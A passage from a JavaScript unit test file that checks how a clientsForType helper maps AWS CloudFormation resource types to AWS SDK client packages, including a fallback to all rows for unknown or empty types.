    const apigw = [{ client: '@aws-sdk/client-apigatewayv2', version: '3.1.0' }];
    expect(clientsForType('AWS::ApiGatewayV2::Stage', apigw)).toEqual(apigw);
  });

  it('falls back to EVERY row rather than to none when nothing matches', () => {
    // An empty answer renders as an absent type, which the section calls
    // "UNKNOWN, not ruled out" — but silently narrowing to nothing would hide a
    // real lag behind a naming mismatch. Widening is the safe direction.
    expect(clientsForType('AWS::Made::Up', rows)).toEqual(rows);
    expect(clientsForType('', rows)).toEqual(rows);
  });
});
